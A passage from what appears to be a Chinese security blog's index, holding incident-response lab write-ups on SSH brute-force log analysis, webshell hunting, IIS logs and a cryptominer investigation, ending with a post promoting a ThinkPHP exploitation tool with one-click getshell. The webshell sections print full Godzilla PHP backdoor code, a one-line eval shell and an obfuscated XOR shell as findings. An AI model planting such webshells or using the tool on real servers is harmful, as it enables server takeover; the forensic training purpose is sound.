系统关机,重启或注销\n","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/46.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-evtx%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/","title":"【玄机靶场】第五章 Windows 实战-evtx文件分析"},{"content":"简介 1 2 账号root密码linuxrz ssh root@IP 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用\u0026quot;,\u0026ldquo;分割\n2.ssh爆破成功登陆的IP是多少，如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n3.爆破用户名字典是什么？如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n4.登陆成功的IP共爆破了多少次\n5.黑客登陆主机后新建了一个后门用户，用户名是多少\n开启靶场 过程 flag1 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n首先肯定是先找到日志的位置，一般来说，SSH登录尝试会记录在 /var/log/auth.log.1（这是固定的）\n接着那既然是爆破，那肯定会有很多失败的次数对吧？\n逻辑基本就是上面这样，如果日志少一些那还好，可以一条条进行分析，日志多的话那可能还要进行筛选；\n命令如下：\n1 cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 可以看出已给出三个地址：\n1 2 3 4 root@ip-10-0-10-6:/var/log# cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 4 192.168.200.2 1 192.168.200.32 1 192.168.200.31 flag：\n1 flag{192.168.200.2,192.168.200.31,192.168.200.32} flag2 2.ssh爆破成功登陆的IP是多少，如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n其实思路也很简单，那既然上面我们都已经得到三个IP了，最多的次数4次，不用想肯定最可疑啊，直接提交就是：\n1 cat auth.log.1 | grep -a \u0026#34;Accepted \u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 简单来说就是分析auth.log.1日志文件，提取出所有包含\u0026quot;Accepted \u0026ldquo;字符串的行，然后使用awk命令提取每行的第11个字段（通常这个字段表示远程IP地址），之后对这些IP地址进行排序和统计，最后按照数量的降序排列，并通过more命令分页显示结果。\n这个命令链条通过以下步骤统计每个IP地址成功登录的次数：\n读取日志文件并筛选出成功登录的记录。 提取记录中的IP地址。 对IP地址进行排序、去重和计数。 按登录次数降序排列并逐页显示结果。\n1 2 root@ip-10-0-10-6:/var/log# cat auth.log.1 | grep -a \u0026#34;Accepted \u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 2 192.168.200.2 flag2\n1 flag{192.168.200.2} flag3 3.爆破用户名字典是什么？如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n那做这这种的思路是什么？\n那首先我们得了解什么是爆破用户名字典？\n简单来说指黑客在进行暴力破解攻击时使用的一系列用户名列表。黑客通过自动化工具逐个尝试这些用户名，结合常见或默认密码，试图找到有效的登录凭据。这个过程被称为“字典攻击”或“暴力破解攻击”。\n具体操作步骤；\n1 cat auth.log.1 | grep -a \u0026#34;Failed password\u0026#34; | perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;|uniq -c|sort -nr 1 2 3 4 5 6 7 8 9 10 root@ip-10-0-10-6:/var/log# cat auth.log.1 | grep -a \u0026#34;Failed password\u0026#34; | perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;|uniq -c|sort -nr 5 invalid user user 5 invalid user hello 5 invalid user 4 root 1 root 1 root 1 invalid user test3 1 invalid user test2 1 invalid user test1 flag3\n1 flag{user,hello,root,test3,test2,test1} flag4 4.成功登录 root 用户的 ip 一共爆破了多少次\n这个就更简单了，其实也和上面第一题重复了，因为问题问：有多少IP在爆破主机ssh的root账号？这里又问成功登录 root 用户的 ip 一共爆破了多少次？而且前面我们在统计IP的时候就已经顺便把次数统计出来了，所以PASS，这里没什么好说的；\n（命令还是第一题的命令，这里只是重复一下，不在多做解释）\n1 cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 1 2 3 4 root@ip-10-0-10-6:/var/log# cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 4 192.168.200.2 1 192.168.200.32 1 192.168.200.31 flag4\n1 flag{4} flag5 5.黑客登陆主机后新建了一个后门用户，用户名是多少\n这个又是一个新的知识点，问我们黑客登陆主机后新建了一个后门用户，用户名是多少？\n那这种我们怎么操作呢？（其实基本也就是这五个步骤）\n步骤1：确定日志文件\n通常与用户登录和用户管理活动相关的日志文件是 /var/log/auth.log 或其备份文件如 /var/log/auth.log.1。\n步骤2：搜索创建用户的关键字\n使用 grep 命令搜索与创建用户相关的关键字，如 new user。这样可以找到所有新建用户的日志条目。\n1 cat /var/log/auth.log.1 | grep -a \u0026#34;new user\u0026#34; 此命令会列出所有包含 new user 的日志行，这些行通常记录了用户创建的详细信息。\n步骤3：提取新用户信息\n从日志中提取新用户的详细信息，包括用户名、创建时间等。\n例如，假设你得到了如下输出：\n1 Jan 12 10:32:15 server useradd[1234]: new user: name=testuser, UID=1001, GID=1001, home=/home/testuser, shell=/bin/bash 这条日志显示了创建的新用户 testuser。\n步骤4：分析执行上下文\n确认新用户的创建是否由合法用户执行，或是否有可疑的远程登录记录。\n可以使用以下命令查找所有用户登录的情况，以确定是否有可疑的登录行为：\n1 grep \u0026#34;Accepted\u0026#34; /var/log/auth.log.1 步骤5：进一步确认\n结合其他日志文件，如 /var/log/syslog，查看是否有异常的命令执行或系统变更。\nflag\n1 flag{test2} 总结 有多少IP在爆破主机ssh的root帐号:\n命令： 1 cat auth.log.1 | grep -a \u0026#34;Accepted \u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 命令解释\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 1. cat auth.log.1: - `cat` 命令用于显示 `auth.log.1` 文件的内容。 - 这里 `auth.log.1` 是一个日志文件，通常是系统日志的备份文件。 2. |: - 管道符号，用于将前一个命令的输出作为下一个命令的输入。 3. grep -a \u0026#34;Failed password for root\u0026#34;: - grep 命令用于在输入中搜索包含特定模式的行。 - -a 选项表示将文件内容视为文本文件（此选项通常在处理二进制文件时使用，但对于纯文本文件，可以省略）。 - `\u0026#34;Failed password for root\u0026#34;` 是搜索模式，即查找所有包含\u0026#34;Failed password for root\u0026#34;的行，这些行表示尝试登录root用户的失败尝试。 4. awk \u0026#39;{print $11}\u0026#39;: - `awk` 是一个文本处理工具，用于按字段处理文本。 - `{print $11}` 表示打印每行的第11个字段。假设日志格式为标准格式，第11个字段通常是IP地址。 5. sort: - `sort` 命令用于对输入行进行排序。 - 这里是对提取的IP地址进行排序。 6. uniq -c: - `uniq` 命令用于删除重复的行。 - `-c` 选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。 7. sort -nr: - `sort` 命令再次用于排序。 - `-n` 选项表示按数值进行排序。 - `-r` 选项表示按降序排序。 - 组合起来，即按出现次数从高到低排序。 8. more: - `more` 命令用于分页显示输出。 - 由于输出可能很长，`more` 命令允许用户逐页查看结果。 ssh爆破成功登陆的IP是多少？\n命令： 1 cat auth.log.1 | grep -a \u0026#34;Accepted \u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 命令解释：\n1 2 3 grep -a \u0026#34;Accepted \u0026#34;: - 作用：在日志文件中查找包含“Accepted ”的行。这些行记录了成功的SSH登录事件。 - `-a`选项：通常用于处理二进制文件时将其视为文本文件，这里一般可以忽略，因为`auth.log.1`应该是纯文本文件 爆破用户名字典是什么？\n命令： 1 cat auth.log.1 | grep -a \u0026#34;Failed password\u0026#34; |perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;|uniq -c|sort -nr 命令解释：\n1 2 3 4 5 6 7 8 9 10 11 - grep -a \u0026#34;Failed password\u0026#34;: - 作用：在日志文件中查找包含“Failed password”的行。这些行记录了SSH登录失败的事件。 - `-a`选项：通常用于处理二进制文件时将其视为文本文件，这里一般可以忽略，因为`auth.log.1`应该是纯文本文件。 - perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;: - 作用：使用Perl脚本从每一行提取出失败登录尝试的用户名。 - `while($_=\u0026lt;\u0026gt;)`：逐行读取输入。 - `/for(.*?) from/`：使用正则表达式匹配模式“for [username] from”，其中`[username]`是登录尝试的用户名。 - `print \u0026#34;$1\\n\u0026#34;`：将提取的用户名打印出来。 - uniq -c: - 作用：对提取出的用户名进行去重并计数。每个唯一的用户名会与其出现的次数一起输出。 - `-c`选项：在每个唯一项的前面显示出现次数。 成功登录 root 用户的 ip 一共爆破了多少次？\n代码： 1 cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 这个就不解释了，跟第一步一样。\n5. 黑客登陆主机后新建了一个后门用户，用户名是多少？\n命令：\n1 cat auth.log.1 |grep -a \u0026#34;new user\u0026#34; 命令解释：\n1 2 3 4 简单来说就是在 grep 命令中 -a 选项的作用是将文件视为文本文件处理，即使文件可能包含一些二进制数据。 通常，grep 会将二进制文件视为二进制数据而不是文本数据，并可能不会显示预期的结果。 使用 -a 选项可以确保 grep 按文本模式处理文件中的内容。 ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/42.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"【玄机靶场】第一章 应急响应- Linux日志分析"},{"content":"简介 1 靶机账号密码 root xjwebshell 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n2.黑客使用的什么工具的shell github地址的md5 flag{md5}\n3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx\n4.黑客免杀马完整路径 md5 flag{md5}\n开启靶场 过程 一、flag1 黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征\n1 2 3 4 find ./ type f -name \u0026#34;*.jsp\u0026#34; | xargs grep \u0026#34;exec(\u0026#34; find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; find ./ type f -name \u0026#34;*.asp\u0026#34; | xargs grep \u0026#34;execute(\u0026#34; find ./ type f -name \u0026#34;*.aspx\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; 对于免杀Webshell，可以查看是否使用编码\n1 find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;base64_decode\u0026#34; 命令解析：\n1 2 1. xargs：xargs命令用于将输入数据重新格式化后作为参数传递给其他命令。在这个命令中，`xargs`将`find`命令找到的文件列表作为参数传递给`grep`命令。 2. `grep \u0026#34;eval(\u0026#34;`：`grep`命令用于搜索文本，并输出匹配的行。这里`\u0026#34;eval(\u0026#34;`是`grep`命令的搜索模式，用于查找包含`eval(`字符串的行。 一个一个进行尝试即可：\n这里使用：\n1 find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; 发现了三个文件：\n1 2 3 ./var/www/html/include/gz.php: eval($payload); ./var/www/html/include/Db/.Mysqli.php: eval($payload); ./var/www/html/shell.php:\u0026lt;?php phpinfo();@eval($_REQUEST[1]);?\u0026gt; 打开gz.php文件\n1 2 3 4 root@ip-10-0-10-5:/# cd /var/www/html/include root@ip-10-0-10-5:/var/www/html/include# ls common.php Db default.htm gz.php index.htm index.html Model root@ip-10-0-10-5:/var/www/html/include# cat gz.php 最后终于在gz.php里面发现了，这样一段代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } //027ccd04-5065-48b6-a32d-77c704a5e26d $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; $data=file_get_contents(\u0026#34;php://input\u0026#34;); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 简单分析一下这段恶意代码；\n@session_start();：启动会话 @set_time_limit(0);：设置脚本执行时间限制为无限制 @error_reporting(0);：关闭错误报告 function encode($D,$K){...}：定义了一个名为 encode 的函数，它接受两个参数 $D 和 $K。这个函数看起来像是一个简单的异或编码函数，用于对数据进行加密或解密。它使用 $K 作为密钥，对 $D 中的每个字符进行异或操作。 接下来的几行代码定义了 $payloadName、$key 和 $data 变量。$payloadName 是用于存储有效载荷的会话变量名，$key 是用于编码的密钥，$data 是从 php://input 流中读取的数据。 if ($data!==false){...}：如果从 php://input 读取的数据不是 false（即成功读取了数据），则执行以下代码块。 if (isset($_SESSION[$payloadName])){...}：检查 $payloadName 对应的会话变量是否已设置。 if (strpos($payload,\u0026quot;getBasicsInfo\u0026quot;)===false){...}：检查 $payload 变量中是否包含字符串 \u0026quot;getBasicsInfo\u0026quot;。 eval($payload);：如果 $payload 变量包含 \u0026quot;getBasicsInfo\u0026quot; 字符串，则执行 $payload 变量中的 PHP 代码。 echo encode(@run($data),$key);：如果 $data 包含 \u0026quot;getBasicsInfo\u0026quot; 字符串，则执行 @run($data) 函数，并将结果编码后输出。\n总结： 1 这段代码的目的是接收通过 php://input 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。 最后找到flag；\n1 flag{027ccd04-5065-48b6-a32d-77c704a5e26d} 二、flag2 黑客使用的什么工具的shell github地址的md5 flag{md5}\n遇到这种类型的题目，我们就是要分析一下是什么类型的webshell，其实开头三句就可以分析出是godzilla的webshell了；\n为什么这样说？\n哥斯拉病毒是一种Java后门木马，通常用于攻击并控制Web服务器。特征就包括：\n1 2 3 1. @session_start(); - 开启一个会话。 2. @set_time_limit(0); - 设置脚本执行时间为无限。 3. @error_reporting(0); - 关闭所有错误报告。 这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。\n所以我们只需要找到它的github地址并且进行MD5加密即可；\n1 Godzilla地址：https://github.com/BeichenDream/Godzilla 直接使用md5加密网站对网站进行加密即可！\n1 https://www.jyshare.com/front-end/703/ 1 flag{39392de3218c333f794befef07ac9257} 三、flag3 黑客使用的什么工具的shell github地址的md5 flag{md5}\n那既然说黑客隐藏shell了，那我们肯定需要用到命令ls -la进行查找；\n然后发现在挨个查找的过程中发现.Mysqlli.php如果普通的ls查看目录是查不出来的，必须用到ls -la才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；\n这里看到一个Db文件夹，然后进去查发现一个.Mysqli.php文件，cat打开一下发现是一个后门文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; $data=file_get_contents(\u0026#34;php://input\u0026#34;); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 然后pwd一下看一下现在的绝对路径：\n1 2 3 root@ip-10-0-10-5:/var/www/html/include/Db# pwd /var/www/html/include/Db root@ip-10-0-10-5:/var/www/html/include/Db# 然后就确定文件的绝对路径：\n1 /var/www/html/include/Db/.Mysqli.php 然后进行MD5加密一下;\n得到flag：\n1 flag{aebac0e58cd6c5fad1695ee4d1ac1919} 四、flag4 黑客免杀马完整路径 md5 flag{md5}\n什么是免杀马？\n免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。\n免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在/var/log目录下。\n然后我们进入日志看一下日志文件：\n进入日志文件夹后发现一个apache2的文件夹，说明网站使用了apache2进行搭建。\n进去后，看一下access.log文件。\n进去后，发现一个top.php执行了phpinfo()；且返回值为200，有点可疑。去找到相对应的文件发现是一个正常的文件来。\n打开文件发现是一个使用base64_decode进行编码混淆了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@ip-10-0-10-5:/var/www/html# cd wap root@ip-10-0-10-5:/var/www/html/wap# ls index.php template top.php root@ip-10-0-10-5:/var/www/html/wap# cat top.php \u0026lt;?php $key = \u0026#34;password\u0026#34;; //ERsDHgEUC1hI $fun = base64_decode($_GET[\u0026#39;func\u0026#39;]); for($i=0;$i\u0026lt;strlen($fun);$i++){ $fun[$i] = $fun[$i]^$key[$i+1\u0026amp;7]; } $a = \u0026#34;a\u0026#34;; $s = \u0026#34;s\u0026#34;; $c=$a.$s.$_GET[\u0026#34;func2\u0026#34;]; 查看一下绝对路径：\n1 2 3 root@ip-10-0-10-5:/var/www/html/wap# pwd /var/www/html/wap root@ip-10-0-10-5:/var/www/html/wap# 绝对路径：\n1 /var/www/html/wap/top.php 然后进行MD5加密：\nflag：\n1 flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de} 总结 找webshell地址 1 2 3 4 5 6 7 //搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征 find ./ type f -name \u0026#34;*.jsp\u0026#34; | xargs grep \u0026#34;exec(\u0026#34; find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; find ./ type f -name \u0026#34;*.asp\u0026#34; | xargs grep \u0026#34;execute(\u0026#34; find ./ type f -name \u0026#34;*.aspx\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; //对于免杀Webshell，可以查看是否使用编码 find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;base64_decode\u0026#34; 分析一下webshell是什么工具 1 可以把代码复制出来进行查询,一般就是蚁剑，哥斯拉，等等 找隐藏webshell 1 这个一般可以使用 ls -la 进行查看隐藏文件，主要需要细心找。 找免杀码，看日志。 1 access.log等等文件。 ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/43.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/","title":"【玄机靶场】第一章 应急响应- webshell查杀"},{"content":"简介 用户名:server2012\n密码:URSZf3A\nflag1 1.phpstudy-2018站点日志.(.log文件)所在路径，提供绝对路径\n• 默认路径：%SystemDrive%\\inetpub\\logs\\LogFiles\\\nflag\n1 flag{C:\\inetpub\\logs\\LogFiles\\W3SVC2} flag2 2.系统web日志中状态码为200请求的数量是多少？\n下载日志文件 awk分析\n1 awk \u0026#39;$12 == 200 \u0026#39; u_ex250220.log| wc -l flag\n1 flag{2315} flag3 3.系统web日志中出现了多少种请求方法\n继续分析请求方式\n1 awk \u0026#39;{print $4} \u0026#39; u_ex250220.log| sort| uniq -c flag\n1 flag{7} flag4 4.存在文件上传漏洞的路径是什么(flag{/xxxxx/xxxxx/xxxxxx.xxx})\n发现是emlog bing搜索emlog文件上传漏洞\n在日志文件中搜索/admin/plugin.php 并且返回值为200的日志\n找到存在文件上传漏洞的php文件\nflag\n1 flag{/emlog/admin/plugin.php} flag5 5.攻击者上传并且利用成功的webshell的文件名是什么\n打包下载源码 解压 火绒报毒\n在日志文件中搜索window.php并且返回值为200\n1 grep \u0026#34;window.php\u0026#34; u_ex250220.log | awk \u0026#39;$12==200 也找到上传用的zip插件\nhttps://github.com/yangliukk/emlog/tree/main\nflag\n1 flag{window.php} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/41.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-iis%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"【玄机靶场】日志分析-IIS日志分析"},{"content":"前提须知 1 2 3 4 5 6 7 小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件： 1.攻击者的shell密码 2.攻击者的IP地址 3.攻击者的隐藏账户名称 4.攻击者挖矿程序的矿池域名(仅域名) 5.有实力的可以尝试着修复漏洞 虚拟机账号/密码:\n1 2 用户：administrator 密码：Zgsf@admin.com 1. 攻击者的shell密码 Webshell后门检查：\n这里推荐使用D盾/河马查杀来检查webshell后门。\n登录系统后，找到web源码地址，上传D盾直接扫描web源码地址，可以看出扫出一个shell.php后门文件。\n打开shell.php文件，查看源码，获取连接密码。\n答案：rebeyond\n2. 攻击者的IP地址 查看日志信息，确定攻击者的IP地址。\n查看/分析 Apache日志可以看出攻击IP。\n答案：192.168.126.1\n3. 攻击者的隐藏账户名称 使用克隆工具，检查账号信息，确定是否存在未知管理员权限的用户信息。\n答案：hack168$\n4.攻击者挖矿程序的矿池域名 登录hack168$用户，看到一个Kuang.exe文件,发现是pyinstaller打包的exe文件,使用pyinstxtractor进行反编译。\n1 2 3 #pyinstxtractor项目地址：\u0026lt;https://github.com/extremecoders-re/pyinstxtractor\u0026gt; 挖矿病毒与反编译脚本放在一个文件夹 执行：python .\\\\pyinstxtractor.py .\\\\Kuang.exe 得到一个反编译好的文件夹，找到一个pyc的文件，Pytpyc文件是Python编译后的字节码文件，通常用于提高加载模块时的速度。\n使用在线pyc反编译工具，得到源码\n使用在线网站即可：\nhttps://www.lddgo.net/string/pyc-compile-decompile\n答案：\nURL：http://wakuang.zhigongshanfang.top\n域名：wakuang.zhigongshanfang.top\n5. 全部答案 1 2 3 4 rebeyond 192.168.126.1 hack168$ wakuang.zhigongshanfang.top ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/36.webp","permalink":"http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb1/","title":"【知攻善防靶场】web1"},{"content":"前提须知 1 2 3 4 5 6 7 8 1.攻击者的 IP 地址（两个） 2.攻击者的 webshell 文件名 3.攻击者的 webshell 密码 4.攻击者的 QQ 号 5.攻击者的服务器伪 IP 地址 6.攻击者的服务器端口 7.攻击者是如何入侵的 8.攻击者的隐藏用户名 虚拟机账号/密码：\n1 2 账号：Administrator 密码：Zgsf@qq.com 2.攻击者的 webshell 文件名 1 首先登录到系统，可以看到有一个phpstudy小皮面板，就存在搭建的网站。 1 上传D盾文件，先扫一边是否存在webshell。并且成功找到后门文件（system.php文件）成功找到第二个题目。 1 答案：system.php 3.攻击者的 webshell 密码 1 使用记事本查看一下system.php文件，发现pass为：hack6618 1 答案：hack6618 1.攻击者的 IP 地址（两个） a)第一个IP地址 1 打开小皮面板，查看一下Apache日志， 1 2 3 从日志里可以看出，192.168.126.135上传了webshell文件，说明这个IP确实是攻击者的IP地址。 192.168.126.135为第一个黑客地址。 7.攻击者是如何入侵的 1 然后我们再看一下ftp是否被攻击，一般黑客也比较喜欢使用ftp发起攻击。 1 FTP 服务中 226 为登录成功的，530 是登录失败的操作 1 2 从日志中我们可以看到黑客使用ftp服务器上传了system.php文件。这里可以确定黑客使用ftp上传的webshell。 答案：攻击者使用fpt进行入侵。 b)第二个IP地址 1 我们使用window的日志分析工具，查看远程登录连接成功的日志。 1 可以看到hack887$用户连接两次，IP地址为:192.168.126.129。 1 答案：192.168.126.129 5.攻击者的服务器伪 IP 地址 1 2 3 查看最近操作目录 使用命令：%userprofile%/Recent 可以看到黑客编辑了内网穿透工具 frp 相关的文件 1 2 3 4 5 打开frp.ini文件 看到伪 ip 256.256.66.88 伪端口 65536 1 答案：256.256.66.88 6.攻击者的服务器端口 1 2 **根据题目五得知： 答案：65536** 4.攻击者的 QQ 号 1 直接打开frp.ini文件文件位置可以看出 1 2 3 那么QQ号应该就是 答案：777888999321 8.攻击者的隐藏用户名 1 我们再使用检查隐藏用户名的脚本，看一下黑客是否新加了一个admin账号 1 答案：hack887$ 所有答案： 1 2 3 4 5 6 7 8 system.php hack6618 192.168.126.135 192.168.126.129 hack887$ 256.256.66.88 65536 777888999321 ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/37.webp","permalink":"http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb2/","title":"【知攻善防靶场】web2"},{"content":"前提须知 1 2 3 4 5 前景需要：小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。 这是他的服务器，请你找出以下内容作为通关条件： 1.攻击者的两个IP地址 2.隐藏用户名称 3.黑客遗留下的flag【3个】 虚拟机账号/密码：\n1 2 用户：administrator 密码：xj@123456 登录到系统之后：\n1 看到有小皮，看一下是否存在后门文件，但未发现有用的信息，看来一下也并非后门文件。 看到有小皮，看一下是否存在后门文件，但未发现有用的信息，看来一下也并非后门文件。\n1. 隐藏用户 1 当我们去检查是否有隐藏用户时发现一个hack6618$的隐藏管理员账户。 1 答案：hack6618$ 2. 攻击者两个IP 1 2 3 4 5 先不管账号，先看一下apache的日志文件，是否有异常。 根据日志可以看出，有两个IP访问频率很高，都是一些注入信息。 所以能确定的是这两个IP为攻击IP。 192.168.75.129 192.168.75.130 1 2 3 4 根据日志可以看出 \u0026lt;http://127.0.0.1/zb_system/login.php\u0026gt; 为后台管理页面 攻击者后面一直访问 /zb_system/cmd.php?act=verify打开网站发现有登录失败的提示，攻击者可能是尝试爆破。 1 继续看日志，发现攻击者使用了admin用户成功登陆进了系统 1 2 3 尝试测试一下啊 \u0026lt;http://127.0.0.1/zb_system/admin/index.php?act=admin\u0026gt; 发现没有权限，目前仅仅只是访客状态。 1 2 3 答案：双IP： 192.168.75.129 192.168.75.130 3. 三个flag flag1 1 登录hack6618$用户看一下是否有什么信息，密码自己改一下即可 1 2 登录到系统，找到了一圈发现下载里有一个system.php文件，打开发现一个flag。 flag{888666abc} 1 答案：flag{888666abc} flag2 1 2 顺着思路找一下,下一步看看有没有自启动项或者计划任务什么的 cmd输入Taskschd.msc 1 2 成功找到flag 答案：flag{zgsfsys@sec} flag3 1 2 3 4 5 6 7 因为是z-blog博客系统，可以找一下重置密码插件，重置一下密码 在 Z-Blog官网找到密码找回工具（免密登录） #官网文章链接 \u0026lt;https://bbs.zblogcn.com/thread-83419.html\u0026gt; #工具下载地址 \u0026lt;https://update.zblogcn.com/tools/nologin.zip\u0026gt; 1 下载解压后将 nologin.php文件放到网站根目录下,直接访问即可。 1 重置完成后，发现黑客创建了一个账号 1 点击用户编辑，发现flag 1 答案：flag{H@Ck@sec} 全部答案： 1 2 3 4 5 6 192.168.75.129 192.168.75.130 hack6618$ flag{888666abc} flag{zgsfsys@sec} flag{H@Ck@sec} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/38.webp","permalink":"http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb3/","title":"【知攻善防靶场】web3"},{"content":"介绍 ThinkPHP漏洞综合利用工具, 图形化界面, 命令执行, 一键getshell, 批量检测, 日志遍历, session包含,宝塔绕过。\n下载地址 1 2 3 通过网盘分享的文件：ThinkPHP.jar 链接: https://pan.baidu.com/s/1eoU2Lf-ldHhy9W2jx8sRpA 提取码: bn8b --来自百度网盘超级会员v4的分享 项目地址 1 https://github.com/bewhale/thinkphp_gui_tools 本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 